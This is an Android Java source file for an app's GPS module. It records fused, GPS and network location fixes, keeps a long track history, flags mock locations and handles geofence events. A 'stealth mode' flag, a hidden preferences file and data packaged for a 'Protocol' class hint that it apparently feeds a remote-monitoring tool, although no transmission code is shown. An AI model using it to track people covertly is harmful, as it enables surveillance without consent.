package com.fason.app.features.gps;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.location.GnssStatus;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class GpsModule {
    private static final String TAG = "GpsModule";

    private static final long GPS_INTERVAL_HIGH = 1000;
    private static final long GPS_INTERVAL_MEDIUM = 5000;
    private static final long GPS_INTERVAL_LOW = 30000;
    private static final float MIN_DISTANCE = 1.0f;
    private static final int MAX_TRACK_HISTORY = 10000;

    private Context ctx;
    private LocationManager locationManager;
    private FusedLocationProviderClient fusedClient;
    private PowerManager powerManager;
    private SharedPreferences prefs;

    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private HandlerThread gpsThread;
    private Handler gpsHandler;
    private ScheduledExecutorService scheduler;

    private LocationCallback fusedCallback;
    private LocationListener gpsListener;
    private LocationListener networkListener;
    private GnssStatus.Callback gnssStatusCallback;

    private Location bestLocation = null;
    private boolean isTracking = false;
    private boolean isMapVisible = false;
    private boolean isStealthMode = false;
    private int satelliteCount = 0;
    private int satelliteUsed = 0;
    private float currentAccuracy = Float.MAX_VALUE;
    private float currentSpeed = 0;
    private float currentBearing = 0;
    private float totalDistance = 0;
    private double currentAltitude = 0;
    private long lastUpdateTime = 0;

    private ConcurrentLinkedQueue<JSONObject> locationQueue = new ConcurrentLinkedQueue<>();
    private List<JSONObject> trackHistory = new CopyOnWriteArrayList<>();
    private Map<String, GeoFence> geofences = new ConcurrentHashMap<>();
    private List<String> triggeredGeofences = new CopyOnWriteArrayList<>();

    private volatile boolean isSpoofingDetected = false;

    private long totalLocations = 0;

    private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    private DecimalFormat dfCoord = new DecimalFormat("#.0000000");

    private static class GeoFence {
        String id;
        String name;
        double lat;
        double lng;
        float radius;
        boolean isInside = false;

        GeoFence(String id, String name, double lat, double lng, float radius) {
            this.id = id;
            this.name = name;
            this.lat = lat;
            this.lng = lng;
            this.radius = radius;
        }
    }

    public GpsModule(Context context) {
        this.ctx = context.getApplicationContext();
        this.prefs = ctx.getSharedPreferences(".gps_config", Context.MODE_PRIVATE);

        locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        fusedClient = LocationServices.getFusedLocationProviderClient(ctx);
        powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);

        gpsThread = new HandlerThread("GpsModuleThread");
        gpsThread.start();
        gpsHandler = new Handler(gpsThread.getLooper());

        scheduler = Executors.newScheduledThreadPool(2);

        taoLocationCallbacks();
        taoGnssCallbacks();
        taiGeofences();
    }

    private void taoLocationCallbacks() {
        fusedCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) return;
                for (Location location : locationResult.getLocations()) {
                    xuLyLocation(location, "FUSED");
                }
            }
        };

        gpsListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                xuLyLocation(location, "GPS");
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override
            public void onProviderEnabled(String provider) {}
            @Override
            public void onProviderDisabled(String provider) {
                chuyenSangNetworkFallback();
            }
        };

        networkListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                xuLyLocation(location, "NETWORK");
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override
            public void onProviderEnabled(String provider) {}
            @Override
            public void onProviderDisabled(String provider) {}
        };
    }

    @SuppressLint("MissingPermission")
    private void taoGnssCallbacks() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            gnssStatusCallback = new GnssStatus.Callback() {
                @Override
                public void onSatelliteStatusChanged(GnssStatus status) {
                    satelliteCount = status.getSatelliteCount();
                    satelliteUsed = 0;
                    for (int i = 0; i < satelliteCount; i++) {
                        if (status.usedInFix(i)) satelliteUsed++;
                    }
                }
            };
            try {
                locationManager.registerGnssStatusCallback(gnssStatusCallback);
            } catch (SecurityException ignored) {}
        }
    }

    private void xuLyLocation(Location location, String source) {
        long now = System.currentTimeMillis();

        if (kiemTraSpoofing(location)) {
            isSpoofingDetected = true;
        }

        long locationAge = now - location.getTime();
        if (locationAge > 120000) return;

        if (bestLocation != null) {
            float distance = location.distanceTo(bestLocation);
            float timeDelta = (now - lastUpdateTime) / 1000f;

            if (timeDelta > 0 && distance > 0) {
                currentSpeed = distance / timeDelta;
            }
            if (distance > 1) {
                currentBearing = bestLocation.bearingTo(location);
            }
            if (distance > 0.5) {
                totalDistance += distance;
            }
        }

        bestLocation = location;
        lastUpdateTime = now;
        currentAccuracy = location.getAccuracy();
        currentAltitude = location.getAltitude();

        luuTrackHistory(location, source);
        kiemTraGeofence(location);
        totalLocations++;
    }

    private void luuTrackHistory(Location location, String source) {
        try {
            JSONObject point = new JSONObject();
            point.put("lat", dfCoord.format(location.getLatitude()));
            point.put("lng", dfCoord.format(location.getLongitude()));
            point.put("accuracy", location.getAccuracy());
            point.put("altitude", location.getAltitude());
            point.put("speed", currentSpeed);
            point.put("bearing", currentBearing);
            point.put("provider", location.getProvider());
            point.put("source", source);
            point.put("satellites", satelliteUsed);
            point.put("timestamp", location.getTime());

            // Trim oldest entries if over max (CopyOnWriteArrayList is safe for iteration)
            while (trackHistory.size() >= MAX_TRACK_HISTORY && !trackHistory.isEmpty()) {
                trackHistory.remove(0);
            }
            trackHistory.add(point);
            locationQueue.offer(point);
        } catch (Exception ignored) {}
    }

    private boolean kiemTraSpoofing(Location location) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (location.isMock()) return true;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            if (location.isFromMockProvider()) return true;
        }
        // Speed > 300 km/h is suspicious
        if (currentSpeed > 83.33f) return true;
        return false;
    }

    private void kiemTraGeofence(Location location) {
        for (GeoFence gf : geofences.values()) {
            float[] results = new float[1];
            Location.distanceBetween(location.getLatitude(), location.getLongitude(), gf.lat, gf.lng, results);
            float distance = results[0];

            if (!gf.isInside && distance <= gf.radius - 50) {
                gf.isInside = true;
                String event = "GEOFENCE_ENTER:" + gf.name;
                triggeredGeofences.add(event);
                Log.d(TAG, event);
            } else if (gf.isInside && distance > gf.radius + 150) {
                gf.isInside = false;
                String event = "GEOFENCE_EXIT:" + gf.name;
                triggeredGeofences.add(event);
                Log.d(TAG, event);
            }
        }
    }

    private void chuyenSangNetworkFallback() {
        try {
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, networkListener);
            }
        } catch (SecurityException ignored) {}
    }

    @SuppressLint("MissingPermission")
    public void startTracking() {
        if (isTracking) return;
        isTracking = true;

        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, GPS_INTERVAL_MEDIUM, MIN_DISTANCE, gpsListener);
            } else {
                chuyenSangNetworkFallback();
            }

            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, GPS_INTERVAL_MEDIUM)
                .setMinUpdateIntervalMillis(2000)
                .setWaitForAccurateLocation(true)
                .build();
            fusedClient.requestLocationUpdates(req, fusedCallback, Looper.getMainLooper());
        } catch (SecurityException ignored) {}
    }

    public void stopTracking() {
        if (!isTracking) return;
        isTracking = false;

        try {
            locationManager.removeUpdates(gpsListener);
            locationManager.removeUpdates(networkListener);
            fusedClient.removeLocationUpdates(fusedCallback);
        } catch (Exception ignored) {}
    }

    public void themGeofence(String id, String name, double lat, double lng, float radius) {
        geofences.put(id, new GeoFence(id, name, lat, lng, radius));
        luuGeofences();
    }

    public void xoaGeofence(String id) {
        geofences.remove(id);
        luuGeofences();
    }

    private void luuGeofences() {
        try {
            JSONArray arr = new JSONArray();
            for (GeoFence gf : geofences.values()) {
                JSONObject obj = new JSONObject();
                obj.put("id", gf.id);
                obj.put("name", gf.name);
                obj.put("lat", gf.lat);
                obj.put("lng", gf.lng);
                obj.put("radius", gf.radius);
                arr.put(obj);
            }
            prefs.edit().putString("geofences", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void taiGeofences() {
        String saved = prefs.getString("geofences", "");
        if (saved.isEmpty()) return;
        try {
            JSONArray arr = new JSONArray(saved);
            for (int i = 0; i < arr.length(); i++) {
                JSONObject gf = arr.getJSONObject(i);
                // Put directly to avoid triggering luuGeofences() save loop
                String id = gf.getString("id");
                geofences.put(id, new GeoFence(
                    id, gf.getString("name"),
                    gf.getDouble("lat"), gf.getDouble("lng"),
                    (float) gf.getDouble("radius")
                ));
            }
        } catch (Exception ignored) {}
    }

    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            if (bestLocation != null) {
                data.put(Protocol.KEY_ENABLED, true);
                data.put(Protocol.KEY_LATITUDE, bestLocation.getLatitude());
                data.put(Protocol.KEY_LONGITUDE, bestLocation.getLongitude());
                data.put(Protocol.KEY_ACCURACY, bestLocation.getAccuracy());
                data.put(Protocol.KEY_SPEED, bestLocation.getSpeed());
                data.put(Protocol.KEY_PROVIDER, bestLocation.getProvider());
                data.put(Protocol.KEY_TIMESTAMP, bestLocation.getTime());
                data.put("altitude", bestLocation.getAltitude());
                data.put("bearing", currentBearing);
                data.put("satellites", satelliteUsed);
                data.put("totalDistance", totalDistance);
            } else {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, "No location");
            }
        } catch (Exception e) {
            try { data.put(Protocol.KEY_ENABLED, false); data.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }

    public JSONObject getTrackHistory() {
        JSONObject result = new JSONObject();
        try {
            JSONArray arr = new JSONArray();
            for (JSONObject pt : trackHistory) arr.put(pt);
            result.put("points", arr);
            result.put("count", trackHistory.size());
            result.put("totalDistance", totalDistance);
            result.put("spoofingDetected", isSpoofingDetected);
        } catch (Exception ignored) {}
        return result;
    }

    public JSONObject getGeofences() {
        JSONObject result = new JSONObject();
        try {
            JSONArray arr = new JSONArray();
            for (GeoFence gf : geofences.values()) {
                JSONObject obj = new JSONObject();
                obj.put("id", gf.id);
                obj.put("name", gf.name);
                obj.put("lat", gf.lat);
                obj.put("lng", gf.lng);
                obj.put("radius", gf.radius);
                obj.put("isInside", gf.isInside);
                arr.put(obj);
            }
            result.put("geofences", arr);
            result.put("triggeredEvents", triggeredGeofences);
        } catch (Exception ignored) {}
        return result;
    }

    public JSONObject getAdvancedData() {
        JSONObject data = getData();
        try {
            data.put("totalLocations", totalLocations);
            data.put("satelliteCount", satelliteCount);
            data.put("satelliteUsed", satelliteUsed);
            data.put("trackHistoryCount", trackHistory.size());
            data.put("geofenceCount", geofences.size());
            data.put("isTracking", isTracking);
        } catch (Exception ignored) {}
        return data;
    }

    public void destroy() {
        stopTracking();
        if (gnssStatusCallback != null) {
            try {
                locationManager.unregisterGnssStatusCallback(gnssStatusCallback);
            } catch (Exception ignored) {}
        }
        if (gpsThread != null) gpsThread.quitSafely();
        if (scheduler != null) scheduler.shutdownNow();
    }
}
